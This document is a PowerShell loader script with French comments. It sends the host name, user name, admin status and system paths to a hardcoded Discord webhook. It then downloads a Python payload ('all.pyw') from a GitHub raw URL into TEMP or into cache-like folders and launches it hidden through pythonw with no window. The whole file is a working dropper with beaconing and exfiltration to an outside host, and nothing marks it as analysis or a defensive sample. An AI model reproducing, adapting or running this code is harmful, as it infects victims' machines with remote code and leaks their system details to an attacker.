$ErrorActionPreference = 'Continue'
$WEBHOOK = 'https://discord.com/api/webhooks/1553812001174851644/XxjDh7jerGG_jVNKlmSF48UEycZFiD7PDwMGMSKiuQ7d9RWeYt-JvGOS3Y-5xPGX3D-E'

function Send-ToWebhook($title, $msg) {
    try {
        $content = "**$title** — $env:COMPUTERNAME`n``````$msg``````"
        $body = @{ content = $content } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $WEBHOOK -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10 > $null
    } catch {}
}

# ========== DÉTECTION ADMIN ==========
$isAdmin = $false
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {}

Send-ToWebhook "LAUNCHER démarré" "User=$env:USERNAME`nAdmin=$isAdmin`nTEMP=$env:TEMP`nLOCALAPPDATA=$env:LOCALAPPDATA`nPSVersion=$($PSVersionTable.PSVersion)"

# ========== ÉTAPE 1 : TÉLÉCHARGEMENT all.pyw ==========
# On essaie 3 emplacements différents (pas seulement %TEMP%)
$allpyw_path = $null
$candidates = @(
    (Join-Path $env:TEMP 'all.pyw'),
    (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\INetCache\all.pyw'),
    (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\NetworkCache\all.pyw')
)

foreach ($cand in $candidates) {
    try {
        $dir = Split-Path $cand -Parent
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
        # Test écriture
        $test = Join-Path $dir ".wtest"
        "ok" | Out-File $test -Encoding ascii
        Remove-Item $test -Force

        Send-ToWebhook "Tentative téléchargement" $cand
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Paladu13/silent/main/all.pyw' -OutFile $cand -UseBasicParsing -ErrorAction Stop

        if (Test-Path $cand) {
            $allpyw_path = $cand
            Send-ToWebhook "Téléchargement OK" "$cand`nTaille: $((Get-Item $cand).Length) bytes"
            break
        }
    } catch {
        Send-ToWebhook "Tentative échouée" "$cand`nErreur: $($_.Exception.Message)"
    }
}

if (-not $allpyw_path) {
    Send-ToWebhook "ERREUR FATALE" "Impossible de télécharger all.pyw dans aucun des emplacements testés"
    exit 1
}

# ========== ÉTAPE 2 : RÉSOLUTION pythonw.exe ==========
$pythonw = $null
$python_candidates = @(
    (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\NetworkCache\Python310\pythonw.exe'),
    (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python310\pythonw.exe'),
    (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python311\pythonw.exe'),
    (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python312\pythonw.exe'),
    'C:\Python310\pythonw.exe',
    'C:\Python311\pythonw.exe',
    'C:\Python312\pythonw.exe',
    'C:\Program Files\Python310\pythonw.exe',
    'C:\Program Files\Python311\pythonw.exe',
    'C:\Program Files\Python312\pythonw.exe'
)

foreach ($c in $python_candidates) {
    if ($c -and (Test-Path $c)) {
        $pythonw = $c
        break
    }
}

if (-not $pythonw) {
    try {
        $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source -and (Test-Path $cmd.Source)) {
            $pythonw = $cmd.Source
        }
    } catch {}
}

if (-not $pythonw) {
    Send-ToWebhook "ERREUR FATALE" "pythonw.exe introuvable partout"
    exit 1
}

Send-ToWebhook "pythonw trouvé" $pythonw

# ========== ÉTAPE 3 : LANCEMENT ==========
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $pythonw
    $psi.Arguments = '"' + $allpyw_path + '"'
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = 'Hidden'
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $proc = [System.Diagnostics.Process]::Start($psi)
    Send-ToWebhook "pythonw lancé OK" "PID=$($proc.Id)`nAdmin=$isAdmin`nExe=$pythonw`nScript=$allpyw_path"
} catch {
    Send-ToWebhook "ERREUR lancement pythonw" "$($_.Exception.Message)`n$($_.ScriptStackTrace)"
    exit 1
}

exit 0
